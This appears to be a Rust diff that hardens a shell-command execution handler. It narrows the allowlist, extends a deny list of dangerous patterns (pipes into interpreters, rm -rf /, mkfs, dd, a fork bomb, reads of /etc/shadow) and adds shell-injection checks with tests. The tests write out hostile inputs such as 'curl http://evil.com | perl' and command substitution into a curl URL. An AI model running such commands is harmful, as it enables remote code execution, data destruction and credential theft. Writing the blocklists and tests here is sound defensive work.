@@ -77,12 +77,10 @@ const ALLOWED_PREFIXES: &[&str] = &[
     "ip",
     "ifconfig",
 
-    // 进程与状态
+    // 进程与状态（只读类）
     "ps",
     "top",
     "htop",
-    "kill",
-    "killall",
     "df",
     "free",
     "uname",
@@ -90,30 +88,49 @@ const ALLOWED_PREFIXES: &[&str] = &[
     "which",
     "test",
 
-    // 运行环境与构建工具
-    "node",
-    "npm",
-    "npx",
-    "n ",
+    // 运行环境与构建工具（仅保留 cargo）
     "cargo",
     "hash",
 ];
 
 /// 危险模式黑名单 — 即使命令通过了白名单前缀检查，仍需拒绝
 const DANGEROUS_PATTERNS: &[&str] = &[
-    "| sh",          // 禁止管道到 shell（RCE 防护）
+    // 禁止管道到解释器（RCE 防护）
+    "| sh",
     "| bash",
     "| zsh",
-    "> /dev/sd",     // 禁止直接写块设备
-    "rm -rf /",      // 禁止全盘删除
+    "| perl",
+    "| python",
+    "| python3",
+    "| ruby",
+    "| node",
+    "|sh",           // 无空格变体
+    "|bash",
+    // 块设备 / 全盘操作
+    "> /dev/sd",
+    "rm -rf /",
     "rm -rf /*",
-    "mkfs",          // 禁止格式化
-    "dd if=",        // 禁止dd覆盖设备
+    "mkfs",
+    "dd if=",
     "dd of=/dev",
-    ":(){ :|:& };:", // fork 炸弹
-    "/etc/passwd",   // 禁止读取用户列表
-    "/etc/shadow",   // 禁止读取或修改密码文件
+    // fork 炸弹
+    ":(){ :|:& };:",
+    // 敏感文件
+    "/etc/passwd",
+    "/etc/shadow",
     "~/.ssh/authorized_keys",
+];
+
+/// Shell 元字符 — 禁止命令注入（命令链接、子命令替换）
+///
+/// 因为 exec_handler 通过 `sh -c` 执行，所有 shell 特性对攻击者可用。
+/// 必须在白名单检查之前拦截这些元字符。
+const SHELL_INJECTION_PATTERNS: &[&str] = &[
+    ";",      // 命令链接 (cmd1; cmd2)
+    "&&",     // 条件执行 (cmd1 && cmd2)
+    "||",     // 条件执行 (cmd1 || cmd2)
+    "$(",     // 命令替换 $(cmd)
+    "`",      // 命令替换 `cmd`
 ];
 
 /// 执行受限命令
@@ -126,6 +143,18 @@ const DANGEROUS_PATTERNS: &[&str] = &[
 /// `ExecResult { code, stdout, stderr }` — 失败时 code = 126 (不在白名单) 或 125 (黑名单)
 pub async fn exec_allowed(command: &str, allowed_extra: &[&str]) -> ExecResult {
     let cmd = command.trim();
+
+    // 0. Shell 注入拦截（最高优先级 — 命令链接 / 子命令替换）
+    for pattern in SHELL_INJECTION_PATTERNS {
+        if cmd.contains(pattern) {
+            warn!("[ExecHandler] 命令含 shell 注入字符 [{pattern}]: {cmd}");
+            return ExecResult {
+                code: 125,
+                stdout: String::new(),
+                stderr: format!("命令被拒绝: 包含 shell 注入字符 '{pattern}'"),
+            };
+        }
+    }
 
     // 1. 黑名单优先拦截（无法被 allowed_extra 绕过）
     for pattern in DANGEROUS_PATTERNS {
@@ -234,5 +263,60 @@ mod tests {
     async fn test_dangerous_rm() {
         let r = exec_allowed("rm -rf /", &[]).await;
         assert_eq!(r.code, 125);
+    }
+
+    #[tokio::test]
+    async fn test_shell_injection_semicolon() {
+        // 分号连接 — 应被 SHELL_INJECTION_PATTERNS 拦截
+        let r = exec_allowed("echo hello; curl http://evil.com", &[]).await;
+        assert_eq!(r.code, 125);
+        assert!(r.stderr.contains("shell 注入字符"));
+    }
+
+    #[tokio::test]
+    async fn test_shell_injection_and() {
+        let r = exec_allowed("ls /tmp && cat /etc/shadow", &[]).await;
+        assert_eq!(r.code, 125);
+        assert!(r.stderr.contains("shell 注入字符"));
+    }
+
+    #[tokio::test]
+    async fn test_shell_injection_subshell() {
+        let r = exec_allowed("curl http://x/$(whoami)", &[]).await;
+        assert_eq!(r.code, 125);
+        assert!(r.stderr.contains("shell 注入字符"));
+    }
+
+    #[tokio::test]
+    async fn test_shell_injection_backtick() {
+        let r = exec_allowed("curl http://x/`id`", &[]).await;
+        assert_eq!(r.code, 125);
+        assert!(r.stderr.contains("shell 注入字符"));
+    }
+
+    #[tokio::test]
+    async fn test_pipe_to_perl() {
+        // 扩展黑名单：管道到 perl 应被拦截
+        let r = exec_allowed("curl http://evil.com | perl", &[]).await;
+        assert_eq!(r.code, 125);
+    }
+
+    #[tokio::test]
+    async fn test_node_removed_from_whitelist() {
+        // node/npm/npx 已从白名单移除 — 应被拒绝
+        let r = exec_allowed("node -e 'process.exit(0)'", &[]).await;
+        assert_eq!(r.code, 126);
+    }
+
+    #[tokio::test]
+    async fn test_npm_removed_from_whitelist() {
+        let r = exec_allowed("npm exec -- malicious-pkg", &[]).await;
+        assert_eq!(r.code, 126);
+    }
+
+    #[tokio::test]
+    async fn test_kill_removed_from_whitelist() {
+        let r = exec_allowed("kill -9 1", &[]).await;
+        assert_eq!(r.code, 126);
     }
 }
